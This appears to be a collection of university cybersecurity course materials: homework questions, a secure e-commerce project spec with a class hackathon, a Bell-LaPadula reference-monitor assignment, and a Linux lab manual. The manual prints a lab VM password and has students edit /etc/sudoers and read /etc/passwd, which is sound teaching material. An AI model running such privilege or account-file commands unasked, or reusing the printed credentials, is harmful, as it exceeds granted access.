For each of the following, decide whether the description is a vulnerability, a threat, or an attack.
Company XYZ is running an out-of-date version of the Apache web server.

Jennifer has just finished programming a new virus.

James is hacking into the web server of Company ABC.

List at least three kinds of harm a company could experience from electronic espionage or unauthorized viewing of confidential company materials.


One control against accidental software deletion is to save all old versions of a program. Of course, this control is prohibitively expensive in terms of cost of storage. Suggest a less costly control against accidental software deletion. Is your control effective against all possible causes of software deletion? If not, what threats does it not cover?



Do you think attempting to break in to (that is, obtain access to or use of) a computing system without authorization should be illegal? Why or why not?


Provide an example of a situation in which each of the following statements is true.
Prevention is more important than detection and recovery.

Detection is more important than prevention and recovery.

Recovery is more important than prevention and detection.

When you say that software is of high quality, what do you mean? How does security fit into your definition of quality? For example, can an application be insecure and still be “good”?


Consider a program that allows consumers to order products from the web. Who might want to attack the program? What types of harm might they want to cause? What kinds of vulnerabilities might they exploit to cause harm?





"
"['final project due', 'project', 'final project', 'project group', 'site', 'project due', 'group', 'web site', 'final project group', 'security', 'project plan', 'web', 'due', 'project proposal', 'monday', 'e-commerce web site', 'project manager', 'final', 'project groups', 'project group listings', 'presentation', 'implement', 'e-commerce web']",The University of North Texas,SECURE ECOMMERCE,5560,Secure Ecommerce Software,Project,"CSCE 5560 Final Project
Due: 11:59 PM on Monday, May 2, 2022
version 0.4 1
Each project group will consist of approximately four students, but may container fewer 
than four. Each team will implement some type of secure e-commerce web application. You 
may choose from, but are not limited to, the following with approval:
• Web Shop – with shopping cart and checkout and item search
• Auction Site – search function, monitoring/filtering
• Simple Bank/Financial Service – move money between accounts, take loans (sign 
agreements), buy funds (sign agreements), payment/withdrawal history, search 
function
• Booking Service – search booking slots/prices
Each e-commerce web site will be implemented using the specific vSphere Client allocated 
for each group. Membership in each group is defined under the Final Project Group listings 
on Canvas. You will have to set up your Virtual Machine (VM) with whatever software or 
technology you wish to implement on your site, but all software must be freely available
and supported on these VMs. A lab assignment on installing WordPress and its various 
components will be assigned, though you may choose to implement your site directly using 
HTML, CSS, PHP, etc. as you wish.
You are encouraged to come up with your own original ideas, but at a minimum, the 
following components must be included:
• A database server – persistent storage for customers, orders, products, etc.
• Shopping cart functionality along with support for reliable and secure transactions, 
including a payment system (such as PayPal Sandbox)
• User registration with authentication (e.g., for login) and verification
• Administration web-interface (may be simple, but functional), such as an employee 
portal with authentication.
Along with these components, you should address areas of security in the context of the 
material we are covering in this course. With regards to security, at a minimum you should 
protect your web site against various types of attacks, mediate all user input, and apply 
security techniques (such as encryption) to protect sensitive data in your database. It should 
be noted that points will be assessed on the project resulting from the “hackathon” on the 
last day of class. Since the hackathon may be destructive (to some extent) and result in your 
web site going down, you will need to implement a disaster recovery plan that includes 
being able to “back up and restore” your site, including the database, to its original 
condition should it be compromised in a short amount of time (approximately 2 – 3 
minutes). Failure to be able to restore your site to its original condition may result in a loss 
of points.
It is recommended that all members of a project group be assigned an area of 
responsibility. Suggested areas of responsibility include front-end design (i.e., user interface 
CSCE 5560 Final Project
Due: 11:59 PM on Monday, May 2, 2022
version 0.4 2
of the web application), payment systems/shopping carts, and database. All students will be 
responsible for security. There should also be a project manager responsible for 
coordinating activities and making sure everything gets done. The project group will have to 
work together on all areas to succeed and all members should be involved to some extent in 
all aspects of the web application. Points will be awarded for site aesthetics as well.
Since it is important to simulate the conditions in a real-world project as much as possible, 
the following conditions must also be followed:
• Each group should have a project manager who will be responsible for overseeing 
the activities. The project manager will participate in other areas of responsibility as 
available.
• Each group will submit a project proposal that gives details about the project, the 
proposed methodology, and expected results.
• Each group will develop a small project plan, including a projection of development
(e.g., perhaps using a Gantt Chart with milestones) and scope of work. The project 
plan should provide additional detail such as the current status, team assignments, 
potential issues (especially security), and a brief market analysis (what other actors 
are competing in the market) and a convincing argument as to what makes you 
better.
• Each group will submit a security report on how their site has been ""hardened"" (i.e., 
how security was implemented) specific to their site, which means, for example, 
how SQL injection attacks were prevented (with specific details perhaps on the PHP 
page as well as database itself, for example). This should include any security 
implications for site design, such as maintaining state information, etc.
Some items you may want to consider when designing your e-commerce web site are:
• Design a system that is secure and flexible. The design should consider the 
requirements, flows/paths, and possible security threats and solutions. Be sure to 
identify and note any decisions made to improve the security of your site.
• Identify different entities in the system (e.g., employee, customer, etc.) and design 
interfaces for each of them.
• Implement forms, database access, transactions, web services, encryption, 
authorization, etc.
• Should customers visiting your e-commerce site be able to search for items on sale, 
based on price, item of interest, etc.?
Project Presentation
Each project group will be required to present their project during the time allocated in 
class near the end of the semester, including a live demonstration of the project, where all 
team members MUST be present. The demo should be no more than 6 minutes, but cover 
CSCE 5560 Final Project
Due: 11:59 PM on Monday, May 2, 2022
version 0.4 3
enough to show 2 customer transactions plus administration (e.g., employee portal) of the 
site. The presentations must include team member roles, data schema, 
architecture/design/user flow, security issues and mitigations/resolutions, and any other 
relevant information, especially as they pertain to concepts and issues discussed in class. 
For example, what potential security issues were raised and how were they addressed? Try 
to make a presentation that sells your project as a reasonable business idea. Each group has 
approximately 10 – 12 minutes worth of presentation time, including the live 
demonstration. Teams will be penalized for going under 10 minutes and stopped after 12
minutes with penalty for items not addressed in their presentation and live demonstration. 
This presentation should contain enough information about the web site regarding the 
major areas of development (i.e., functionality and security) discussed during the course of 
the semester, including issues and resolutions. Any special features should also be 
documented.
Timeline/Dates
Project Proposal A project proposal will be due on Monday, March 28th.
Project Plan A project plan will be due on Monday, April 4th.
Security Report A security report will be due the week before the presentations are being 
made.
Presentation Presentations will be done during regularly scheduled class time on 
Tuesday, April 26th, Thursday, April 28th, and Tuesday, May 3rd. Teams will 
be chosen at random in advance to present on a particular day.
Hackathon Teams will meet on the last day of the regularly scheduled class day 
(Thursday, May 5th) to participate in a ""hackathon"" where each group will 
have the opportunity to try to manually ""hack"" into any other team’s site. 
Note that you must be present to receive points for this effort.
Note that only one submission will be required for each group for these assignments. A 
group assessment evaluation will also be required for each team member, which can result 
in grading marks being reduced based on the evaluation.
Submission
Your web site must be able to run on the vSphere Clients, with access given to the TA. You 
should submit all relevant files in a ZIP file to Canvas, including a README file that explains 
the information required how to install and build the site, including how it works. You 
should also include various screen shots of your site working.
Note that the dates on your electronic submission will be used to verify that you met the 
due date above. All projects up to 24 hours late will receive a 30% grade penalty. Later 
submissions will receive zero credit, so hand in your best effort on the due date. This is 
needed, as the TA will be working with each team to set up the environment for the 
hackathon on Thursday, May 5th.
CSCE 5560 Final Project
Due: 11:59 PM on Monday, May 2, 2022
version 0.4 4
--------------------------------------------------------------------------------------------
Any questions or exceptions to these specifications should be clarified with your instructor 
and/or the TA.
Note that this document may be updated as needed to address unforeseen issues, especially 
since this is being done online this semester, but all changes will be communicated with the 
project groups"
"['medium', 'high', 'low', 'access granted', 'subject', 'object', 'instruction', 'read', 'granted', 'access', 'write', 'bad instruction', 'high status write', 'foundations of cybersecurity', 'cybersecurity spring', 'reference monitor', 'subject added', 'object added', 'status', 'instruction object', 'objects', 'added', 'addsub', 'addobj']",The University of North Texas,INTRO TO COMPUTER SECURITY,3550,Secure Software Development,Project,"CSCE 3550 Foundations of Cybersecurity Spring 2022
1
Project 1
Due: 11:59 PM on Friday, March 4, 2022
PROGRAM DESCRIPTION:
For this project, you will implement a simple “secure” system in any object-oriented 
programming language supported on our Linux CSE machines following the Bell-LaPadula 
(BLP) security rules – simple security and the *-property – in addition to following strong 
tranquility. Your system will have subjects and objects. Each subject can make a request to 
access an object, but first gets checked by a reference monitor. The monitor makes a decision to 
allow or deny by referring to the security levels of the subject as well as the object the subject is 
trying to access. This security mechanism can be described as follows:
Item Description
Subject Entity requesting access.
Object The resource to which the subject is requesting access.
Reference Monitor – Access 
Control Enforcement Function
Intercepts all subject requests to access control objects and implements the 
decisions as to whether these requests will be granted or denied.
Access Control Decision Function Makes the decision as to whether the access request will be granted or 
denied.
Both subjects and objects should be implemented as separate classes and contain only name
(string) and value (integer) member data, where both the subject’s and object’s integer value 
are initially 0. Subjects and objects can be added to the system using the ADDSUB and ADDOBJ
commands, respectively, that includes the name and security level, where the security level can 
be LOW, MEDIUM, and HIGH as follows:
ADDSUB subject_name security_level
ADDOBJ object_name security_level
Except for requiring a valid syntax, ADDSUB and ADDOBJ are not subject to security rules (i.e., 
any syntactically valid ADDSUB and ADDOBJ should be passed to the reference monitor to add 
the subject and object, respectively).
Subjects can perform READ and WRITE operations on objects as follows:
READ subject_name object_name
WRITE subject_name object_name value
CSCE 3550 Foundations of Cybersecurity Spring 2022
2
For a READ, the subject reads the current value of the object and saves that value into its integer 
variable (a subsequent READ will change that value to the new one being read). Essentially, the 
subject’s integer variable will contain the value the subject most recently read. When a subject 
does a WRITE, the object’s value is updated to the value specified.
One final command to print the current state of both subjects and objects is supported as follows:
STATUS
STATUS is not subject to security rules, meaning that any syntactically valid STATUS should 
simply pass through the reference monitor without needing to be validated.
The input to your system is simply a file of commands. You will read successive lines from the 
file and parse each into an instruction object (perhaps a struct or class). Commands are not 
case-sensitive (even subject and object names). Arbitrary whitespace is allowed in commands, 
though you may assume that each command is on one line. You must perform error checking for 
any file operations.
Be sure to deal with the possibility of errors in the instructions (i.e., incorrect ADDSUB, 
ADDOBJ, READ, WRITE, or STATUS, wrong number/type of arguments, etc.). For syntactically 
illegal instructions, you will indicate that it is a Bad Instruction and print out the illegal 
command, but you will not pass it to the reference monitor as described below.
To add security to the system, both subjects and objects are given associated security levels. 
These levels are maintained by a RefMon class object (i.e., reference monitor) and cannot be 
changed after they are created (i.e., they have strong tranquility). Essentially, the reference 
monitor will manage the two mappings from the subject and object names to their security levels.
In our secure system, whenever a subject requests to perform a syntactically legal action (i.e., 
READ or WRITE), the parsed instruction object is submitted to the reference monitor, which 
decides whether to perform the action or not based on the BLP properties (i.e., the simple 
security and the *-property). If the instruction is both syntactically legal and is allowed by the 
BLP rules, the reference monitor indicates that access is granted and then calls the applicable 
target (i.e., the Subject object and/or Object object) to perform the appropriate operation. 
Otherwise, the reference monitor indicates that access is denied and prints the instruction object, 
but no objects are accessed. Additionally, we extend the notion of a Bad Instruction to be 
a syntactically legal instruction that references a subject or object that does not exist, though this 
can be passed to the reference monitor to make that determination.
All syntactically legal subject and object accesses MUST go through the reference monitor. If 
the subject is performing a READ, it then stores this value (from the object) to its integer 
variable. Think of the reference monitor as a firewall around the subjects and objects. The 
subjects and objects themselves don’t care about security levels. They just do what the reference 
monitor tells them through simple accesses, so any security levels must be in the reference 
monitor, not in the Subject or Object objects themselves.
You should have methods such as addSubject(), addObject(), executeRead(),
executeWrite(), and printState() within your RefMon class that checks access 
requests and performs the appropriate action (if any) on the target’s state, following the 
instruction semantics outlined above.
CSCE 3550 Foundations of Cybersecurity Spring 2022
3
The main part of your program should manage the reference monitor and also serve as the 
command interpreter. It should read successive instructions from the instruction list file, parse 
them, and submit syntactically legal commands to the reference monitor for verification.
Your task is to implement this secure system, subject to the following constraints:
• The SecurityLevel should be defined as LOW, MEDIUM, and HIGH with a 
“dominates” relation. You may assume that levels are linearly ordered. That is, it is a 
total order so you do not need to worry about categories.
• When you parse a command from the input file, for any syntactically legal command you 
will create an instruction object with fields representing the instruction type (i.e., 
ADDSUB, ADDOBJ, READ or WRITE), the subject’s name, the object’s name, and value, 
if any. It is this instruction object that you pass to the RefMon object. For an ill-formed 
instruction, you can simply indicate that it is a bad instruction and print out the command
without sending to the reference monitor. Note that the STATUS command is not subject 
to this requirement.
The STATUS command will call a method in RefMon that prints out the names, security levels, 
and current values of all the subjects and objects. Additionally, you will “internally” invoke the 
STATUS command after the final instruction has been executed to print out the final state of the 
subjects and objects in the secure system. Note, however, that this kind of information is not 
something that typically a secure system would do, but it is being asked for here in the context of 
the assignment.
To ensure that your code is correctly compiled and/or executed, please include a README file 
with any important compiling/running instructions, such as using a makefile or any required 
compile options like libraries and flags, for the TA. 
Your program will be tested using a suite of 3 – 5 input files on the Linux CSE machines, some 
of which will exercise your program’s ability to correctly execute commands and some of which 
will test your program’s ability to catch error conditions. You should not “hard-code” any items 
in your system. Be sure that you thoroughly exercise your program’s capabilities on a wide range 
of test suites.
REQUIREMENTS:
• Your code should be well documented in terms of comments. For example, good 
comments in general consist of a header (with your name, course section, date, and a 
brief description), comments for each variable, and commented “blocks” of code.
• Even though it is stated above, two following requirements must be explicitly adhered to
or result in significant points being deducted:
o All subjects and objects MUST be implemented as classes and instantiated as actual
objects, not just an entry in an array, etc.
o The security labels must be contained and managed by the reference monitor and be 
SEPARATE from the actual Subject/Object object. I.e., the Subject and 
Object class/object must only contain name and value, not security level.
CSCE 3550 Foundations of Cybersecurity Spring 2022
4
• Your program will be graded largely on whether it works correctly on the CSE machines 
(e.g., cse01, cse02, …, cse06), so you should make sure that your program compiles 
and runs on a CSE machine.
• Please pay attention to the SAMPLE OUTPUT for how this program is expected to 
work. If you have any questions about this, please contact your instructor, TA, or IA 
assigned to this course to ensure you understand these directions.
• This is an individual programming assignment that must be the sole work of the 
individual student. Any instance of academic dishonesty will result in a grade of “F” for 
the course, along with a report filed into the Academic Integrity Database.
SAMPLE OUTPUT (user input shown in bold):
Although I have used 7 alphanumeric characters for both subjects and objects in my instruction 
list for this sample output, there is no restriction to the length of the subject or object names.
$ more instrList
addsub kel0004 LOW
addsub jms0381 MEDIUM
addsub sam0039 HIGH
addobj file001 MEDIUM
addobj file002 LOW
status
write kel0004 file002 20
write jms0381 file001 10
status 10
status
read sam0039 file001
read kel0004 file001
read kel0004 file002
addobj file003 HIGH
status
write jms0381 file002
read sam0039
write jms0381 file001 40 80
read krt1039 file003 50
write kel0004 file001 10
status
addsub sra0002 LOW
read sra0002 file003 
addsub krt0084 MEDIUM
addsub liz0028 HIGH
status
write krt1039 file004 40
write liz0028 file001 20
write liz0028 file003 30
read sra0002 file002
status
addobj file004 HIGH
addobj file005 LOW
read liz0028 file005
write sra0002 file005 50
status
addobj file006 MEDIUM
write jms0381 file006 30
CSCE 3550 Foundations of Cybersecurity Spring 2022
5
write kel0004 file006 20
status
read liz0028 file003
read krt1039 file004
read jms0381 file004
read krt0084 file001
read krt0084 file005
status
write sam0039 file006 90
write sam0039 file005 x
write liz0028 file004 60
write liz0028 file005 60
status
read sra0002 file007
exec adm0831 file004
read sam0039 file006
read jms0381 file005
write sra0002 file004 70
$ make clean
rm *.o secureblp
$ make
g++ -c -g -std=c++0x -Wall -c -o Subject.o Subject.cpp
g++ -c -g -std=c++0x -Wall -c -o Object.o Object.cpp
g++ -c -g -std=c++0x -Wall secureBLP.cpp
g++ -c -g -std=c++0x -Wall -c -o RefMon.o RefMon.cpp
g++ -o secureblp Subject.o Object.o secureBLP.o RefMon.o
$ ./secureblp
usage: secureblp instructionList
$ ./secureblp badfile
Unable to open badfile file. Terminating...
$ ./secureblp instrList
Subject Added : addsub kel0004 LOW
Subject Added : addsub jms0381 MEDIUM
Subject Added : addsub sam0039 HIGH
Object Added : addobj file001 MEDIUM
Object Added : addobj file002 LOW
+--------current state--------+
|-subject-|--level--|--value--|
| kel0004 | LOW | 0 |
| jms0381 | MEDIUM | 0 |
| sam0039 | HIGH | 0 |
|--object-|--level--|--value--|
| file001 | MEDIUM | 0 |
| file002 | LOW | 0 |
+-----------------------------+
Access Granted : kel0004 writes value 20 to file002
Access Granted : jms0381 writes value 10 to file001
Bad Instruction : status 10
+--------current state--------+
|-subject-|--level--|--value--|
| kel0004 | LOW | 0 |
| jms0381 | MEDIUM | 0 |
| sam0039 | HIGH | 0 |
|--object-|--level--|--value--|
| file001 | MEDIUM | 10 |
| file002 | LOW | 20 |
+-----------------------------+
CSCE 3550 Foundations of Cybersecurity Spring 2022
6
Access Granted : sam0039 reads file001
Access Denied : read kel0004 file001
Access Granted : kel0004 reads file002
Object Added : addobj file003 HIGH
+--------current state--------+
|-subject-|--level--|--value--|
| kel0004 | LOW | 20 |
| jms0381 | MEDIUM | 0 |
| sam0039 | HIGH | 10 |
|--object-|--level--|--value--|
| file001 | MEDIUM | 10 |
| file002 | LOW | 20 |
| file003 | HIGH | 0 |
+-----------------------------+
Bad Instruction : write jms0381 file002
Bad Instruction : read sam0039
Bad Instruction : write jms0381 file001 40 80
Bad Instruction : read krt1039 file003 50
Access Granted : kel0004 writes value 10 to file001
+--------current state--------+
|-subject-|--level--|--value--|
| kel0004 | LOW | 20 |
| jms0381 | MEDIUM | 0 |
| sam0039 | HIGH | 10 |
|--object-|--level--|--value--|
| file001 | MEDIUM | 10 |
| file002 | LOW | 20 |
| file003 | HIGH | 0 |
+-----------------------------+
Subject Added : addsub sra0002 LOW
Access Denied : read sra0002 file003
Subject Added : addsub krt0084 MEDIUM
Subject Added : addsub liz0028 HIGH
+--------current state--------+
|-subject-|--level--|--value--|
| kel0004 | LOW | 20 |
| jms0381 | MEDIUM | 0 |
| sam0039 | HIGH | 10 |
| sra0002 | LOW | 0 |
| krt0084 | MEDIUM | 0 |
| liz0028 | HIGH | 0 |
|--object-|--level--|--value--|
| file001 | MEDIUM | 10 |
| file002 | LOW | 20 |
| file003 | HIGH | 0 |
+-----------------------------+
Bad Instruction : write krt1039 file004 40
Access Denied : write liz0028 file001 20
Access Granted : liz0028 writes value 30 to file003
Access Granted : sra0002 reads file002
+--------current state--------+
|-subject-|--level--|--value--|
| kel0004 | LOW | 20 |
| jms0381 | MEDIUM | 0 |
| sam0039 | HIGH | 10 |
| sra0002 | LOW | 20 |
| krt0084 | MEDIUM | 0 |
CSCE 3550 Foundations of Cybersecurity Spring 2022
7
| liz0028 | HIGH | 0 |
|--object-|--level--|--value--|
| file001 | MEDIUM | 10 |
| file002 | LOW | 20 |
| file003 | HIGH | 30 |
+-----------------------------+
Object Added : addobj file004 HIGH
Object Added : addobj file005 LOW
Access Granted : liz0028 reads file005
Access Granted : sra0002 writes value 50 to file005
+--------current state--------+
|-subject-|--level--|--value--|
| kel0004 | LOW | 20 |
| jms0381 | MEDIUM | 0 |
| sam0039 | HIGH | 10 |
| sra0002 | LOW | 20 |
| krt0084 | MEDIUM | 0 |
| liz0028 | HIGH | 0 |
|--object-|--level--|--value--|
| file001 | MEDIUM | 10 |
| file002 | LOW | 20 |
| file003 | HIGH | 30 |
| file004 | HIGH | 0 |
| file005 | LOW | 50 |
+-----------------------------+
Object Added : addobj file006 MEDIUM
Access Granted : jms0381 writes value 30 to file006
Access Granted : kel0004 writes value 20 to file006
+--------current state--------+
|-subject-|--level--|--value--|
| kel0004 | LOW | 20 |
| jms0381 | MEDIUM | 0 |
| sam0039 | HIGH | 10 |
| sra0002 | LOW | 20 |
| krt0084 | MEDIUM | 0 |
| liz0028 | HIGH | 0 |
|--object-|--level--|--value--|
| file001 | MEDIUM | 10 |
| file002 | LOW | 20 |
| file003 | HIGH | 30 |
| file004 | HIGH | 0 |
| file005 | LOW | 50 |
| file006 | MEDIUM | 20 |
+-----------------------------+
Access Granted : liz0028 reads file003
Bad Instruction : read krt1039 file004
Access Denied : read jms0381 file004
Access Granted : krt0084 reads file001
Access Granted : krt0084 reads file005
+--------current state--------+
|-subject-|--level--|--value--|
| kel0004 | LOW | 20 |
| jms0381 | MEDIUM | 0 |
| sam0039 | HIGH | 10 |
| sra0002 | LOW | 20 |
| krt0084 | MEDIUM | 50 |
| liz0028 | HIGH | 30 |
CSCE 3550 Foundations of Cybersecurity Spring 2022
8
|--object-|--level--|--value--|
| file001 | MEDIUM | 10 |
| file002 | LOW | 20 |
| file003 | HIGH | 30 |
| file004 | HIGH | 0 |
| file005 | LOW | 50 |
| file006 | MEDIUM | 20 |
+-----------------------------+
Access Denied : write sam0039 file006 90
Bad Instruction : write sam0039 file005 x
Access Granted : liz0028 writes value 60 to file004
Access Denied : write liz0028 file005 60
+--------current state--------+
|-subject-|--level--|--value--|
| kel0004 | LOW | 20 |
| jms0381 | MEDIUM | 0 |
| sam0039 | HIGH | 10 |
| sra0002 | LOW | 20 |
| krt0084 | MEDIUM | 50 |
| liz0028 | HIGH | 30 |
|--object-|--level--|--value--|
| file001 | MEDIUM | 10 |
| file002 | LOW | 20 |
| file003 | HIGH | 30 |
| file004 | HIGH | 60 |
| file005 | LOW | 50 |
| file006 | MEDIUM | 20 |
+-----------------------------+
Bad Instruction : read sra0002 file007
Bad Instruction : exec adm0831 file004
Access Granted : sam0039 reads file006
Access Granted : jms0381 reads file005
Access Granted : sra0002 writes value 70 to file004
+---------final state---------+
|-subject-|--level--|--value--|
| kel0004 | LOW | 20 |
| jms0381 | MEDIUM | 50 |
| sam0039 | HIGH | 20 |
| sra0002 | LOW | 20 |
| krt0084 | MEDIUM | 50 |
| liz0028 | HIGH | 30 |
|--object-|--level--|--value--|
| file001 | MEDIUM | 10 |
| file002 | LOW | 20 |
| file003 | HIGH | 30 |
| file004 | HIGH | 70 |
| file005 | LOW | 50 |
| file006 | MEDIUM | 20 |
+-----------------------------+
SUBMISSION:
• You will electronically submit all of your source code files, makefile, if applicable,
plus a README file with any important compiling/running instructions for the TA to the 
Project 1 dropbox in Canvas by the due date."
"['file', 'security lab', 'select date', 'type', 'command', 'security lab student', 'directory', 'files', 'user', 'linux', 'file security lab', 'lab', 'home', 'security', 'select', 'date', 'commands', 'print', 'home directory', 'commands security lab', 'file system', 'linux command', 'directory security lab', 'change', 'system']",The University of North Texas,INTRO TO COMPUTER SECURITY,5550,Security Lab,Lab,"Security Lab
 
Student Name: 
Table of Contents
1. An Overview of Linux 
2. Kali Linux-Intro
3. Linux Terminal-Intro
4. User Account Management
5. Usage of Some Basic Commands
6. File Permissions and Access Control
7. Installing Software
8. Text Editors - Nano & Vim
9. List of Useful Commands
SECURITY LAB - [SELECT DATE] 2
An Overview of Linux
A typical Linux operating system is made up of three parts: the kernel, the shell and 
the applications.
Kernel: The kernel of Linux is the hub of the operating system: it allocates time and memory to 
programs and handles the file storage as well as response to system calls.
Shell: The shell acts as an interface between the user and the kernel. When a user logs in (into 
command line only environment), the login program checks the username and password, and then 
starts another program called the shell. The shell is a command line interpreter (CLI). It interprets 
the commands, which are typed by the user, and it arranges for them to be carried out. 
The commands are themselves programs: when they terminate, the shell gives the user another 
prompt. A graphical user interface for the shell is called Terminal.
Desktop Environment: Linux operating systems also have a graphical user interface (GUI) 
through which users can access applications and system resources. Unlike other operating systems 
Linux OS has many Desktop Environments available. Users are free to install the GUI of their 
choice. Some popular ones are GNOME, KDE, XFCE, Ubuntu Unity, etc. When one installs
a Linux system, it comes with a default GUI. One can install other GUIs at any time, but only one 
GUI environment can be used at a time. For example, Kali Linux comes with GNOME.
Linux Directory Structure: In Linux, files and directories (folders) are laid out on disk in 
hierarchical fashion in a tree structure. The top directory is called root folder, it is denoted by “/” 
(slash). A collection of all files and directories in a Linux machine is referred to as 
a “filesystem”. 
A path (location) of a file or directory in the filesystem is written starting from the root directory 
(/) followed by all intermediate directory names, which are separated by a slash with the actual file 
name (or directory name) in the end of the path. Example: the file path of the file “report.doc” in 
the above figure is written as /home/its/ug1/ee51vn/report.doc
SECURITY LAB - [SELECT DATE] 3
Notes:
1. In the path /home/its/ug1/ee51vn/report.doc, do not get confused between first slash /
which denotes the root directory and subsequent slashes, which are used to separate 
directories at each level of the path. 
2. There are no spaces in a file path. Example: The file path 
“/home/its/ug1/ee51vn/report.doc” is the one single string with no spaces between 
slashes and subsequent folder names.
Question 1: Write the path for directory staff in above figure.
Different default directories under the / directory are used for some specfic purposes.
/bin : All executable binary files (including commands) are present in this directory.
/dev : Contains device files for hardware devices (usb, cdrom etc.)
/etc : Contains application’s configuration files, startup, shutdown, start, stop script for every 
individual program. 
/home : Home directory of the users. Every time a new user is created, a directory with the 
corresponding username is created within /home which contains other directories such as Desktop, 
Downloads, Documents, etc. 
/lib : Contains the kernel modules and shared library images required to boot the system and 
run commands in the root file system. 
/lost+found : This directory is created during installation of Linux, useful for recovering files 
which may be broken due to unexpected shutdown. 
/media : Temporary mount directory is created for removable devices viz., media/cdrom. 
/mnt : Temporary mount directory for mounting file system. 
/opt : Contains the third-party application software viz. Java, etc. 
/proc : A virtual and pseudo filesystem which contains information about running processes with 
a particular process id abbreviated as “pid”.
Introduction to Linux
There exist many Linux OS distributions (around 3500 are known), but most of them are created 
from the same Linux kernel. We will use Ubuntu and Kali Linux for most of the labs in this course. 
Kali is mainly used for computer security and digital forensics applications. Other popular Linux 
variants are Redhat, Debian, and CentOS.
The purpose of this lab is a quick introduction to working with VirtualBox and Linux.
No report needs to be submitted for this lab (no grading and no credit), so no need to take 
screenshots and answer questions, as requested in the manual.
Nonetheless, you are expected to be familiar with the material covered in this lab.
Note that some of the screenshots shown in this manual may be outdated (as they may come 
from earlier versions of the software).
In this lab, you will be using the Ubuntu 20 VM. The credentials are: 
Username: sec-lab
Password: untccdc
SECURITY LAB - [SELECT DATE] 4
If the OS doesn’t start, select in the menu the Machine option and press Settings.
Go to the Network section and change a value in the field “Attached” to “NAT”
Press Ok button and go again to the Machine option and press Reset.
This is how the default desktop environment on a Ubuntu Desktop OS looks like. On the left there 
is menu bar: Dash Home, Home folder, FireFox Browser, Stytem Settings, and workspaces
1. To Open Terminal: Click on Dash Home and write “terminal” in the searching. Click in 
the “Terminal” icon.
2. To Open Web Browser: Click on the FireFox Browser
3. To Open Text Editors: Click on Dash Home and write “edit” in the searching. Click in 
the “Text Editor” icon
4. To Open File System: Click in Home folder
SECURITY LAB - [SELECT DATE] 5
Linux Terminal -Intro
1. Open Terminal by clicking on Dash Home and write “terminal” in the searching. 
Click in the “Terminal” icon.
2. You will see a Terminal window like this one: 
The text sec-lab@ubuntu:~# is the shell prompt. It means user sec-lab, is logged into 
machine ubuntu. I used sec-lab as my system name. # indicates super user root. For normal 
user it is the $ symbol. For a normal user bob, the prompt looks like: bob@ubuntu:~$
The ~ (tilde) symbol indicates that the user is currently in his home directory. For the root 
user the home directory is /root. For the user “sec-lab” the home directory would be 
/home/sec-lab. In later sections I’ll explain the difference between a super user root and a 
normal user.
Linux Command Format:
A typical linux command has 3 parts: command, options and arguments. Options starts 
with “-“ symbol (hyphen or minus symbol). There are always spaces in between command, 
option and arguments
Ex: “ls -l /home”. In this “ls” is command, “–l” is option, “/home” is argument. This 
command lists all file and folders in the folder /home. Note that there are always spaces in 
between command, arguments and options. You have to type this command in this way: 
ls<space>-l<space>/home. 
Notes:
a. To separate commands from normal text I used double quotes but when you are 
typing commands in shell do it without quotes. DO NOT USE QUOTES. In every 
tutorial (on line tutorials or Text Books) it is customary to use some kind of text 
scheme to separate command from explanation. By end of the lab you’ll be able to 
differential between a normal text and a Linux command.
SECURITY LAB - [SELECT DATE] 6
b. The italic part in command is a sample name – you have to use the actual name 
according to your environment. For example if I asked you to type 
“/home/username”, if your username is “bob” you have to type /home/bob.
c. All Commands in Linux are case sensitive: pwd and Pwd are not same.
User Account Management
1. Creating a new user account for you:
a. Type “sudo su”. The system will ask for the root password, which is “untccdc”, so 
type it. The shell prompt will change to # and now you are working as a root. 
b. Type “adduser username”. Give a desired one in place of username. In the below 
screenshot, this username is alice.
c. Enter a password for your account. You have to do it twice.
Note: Passwords are not shown in terminal as you type them. Usually while typing 
password, you will see ***** (stars) or ……… (dots). But now, you do not see 
anything on the Linux Terminal.
d. Add further user details. These details are optional, so you can just hit enter to skip 
Full Name, Number, Phone, and other data – see the below screenshot.
e. Type “y” at “Is this information correct?”
2. To change any user password use passwd command.
Example: passwd alice
3. Add new user to sudoers file to give this user the superuser permissions.
SECURITY LAB - [SELECT DATE] 7
a. Type “nano /etc/sudoers”. (nano is a command line text editor, it is explained in 
detail in Text Editors section of this Lab document).
b. In that file, add the following line:
Username ALL=(ALL:ALL) ALL. It should be added next to the following one:
root ALL=(ALL:ALL) ALL. In the below example, the username is alice. 
You have to give your newly created username.
c. Press Control+O, Enter, when asked for confirmation, press Control+X to exit.
4. Close the terminal window. 
5. Restart. Go to the upper menu and press in the right corner icon and Shut Down.
In the new window press the Restart button.
6. Login with your new user.
Question 2: Login to your new user account, open a terminal and type “sudo su”, enter 
sudo password for your account, and submit a screenshot. The screenshot should clearly 
show the prompt. It looks like root@ubuntu:/home/alice.
7. Create another user from your account.
a. Open Terminal after logging into your account.
b. Type “sudo adduser bob”. Enter sudo password for your account. 
Note: the user password is asked when you use the “sudo” command for first time in 
a terminal. The command “sudo” is used to elevate a normal user to the root user for 
execution of some high-privilege commands.
c. Add a (unix) password for new user bob twice and complete the rest of the details 
as done earlier. 
SECURITY LAB - [SELECT DATE] 8
8. To change to the root user from the ordinary user:
a. Type “sudo su –” .
b. Type the root user password at the prompt. After successful login, you should 
observe a change in shell prompt from your current user to the root user.
c. Type “exit” to exit from the root user. Now, you should be back to your normal
user prompt.
Question 3: Type “tail /etc/passwd” (/etc/password is one string, it should not contain 
spaces.) Submit a screenshot of this step.
The root user (also called the superuser) is an administrator of system who has full 
privileges by default, while an ordinary user has limited privileges. An ordinary user needs
to use “sudo” command to be able to run certain high-privilege commands, temporarily. 
Example: to install software, to change to the root user in terminal, to change the system 
settings, etc.
Usage of Some Basic Commands:
Files and Directories 
9. pwd - present working directory
Type “pwd” in the command prompt (without quotes). This command displays the current 
directory. When a user starts the shell, the default directory is user’s home directory: 
/home/username. (Here, username is your login name used when logging into the VM).
SECURITY LAB - [SELECT DATE] 9
10. cd – change directory
This command is used to change to a desired directory from the current directory.
a. Type “cd /home” (without quotes). This will move the user to the /home directory.
b. Type “pwd”. Confirm that you are in /home.
c. Type “cd -”. This will take you back to previous directory, i.e., your home directory.
d. You can use “cd ~” to go back to your home directory from anywhere. 
(~ tilde symbol)
e. The symbol “.” (a single dot) refers to the current directory, “..” (double dots) refers
to the parent directory.
“cd .” keeps you in same directory, while “cd ..” moves you to the parent directory, 
which is one level up in the directory tree. Correspondingly, “cd ../..” moves you 
two levels up, with respect to the current directory.
11. ls – list
ls command simply lists file and directories in the present directory. An option “–l” gives 
a more detailed information, which includes, e.g., file sizes, time of creation, permissions,
and other.
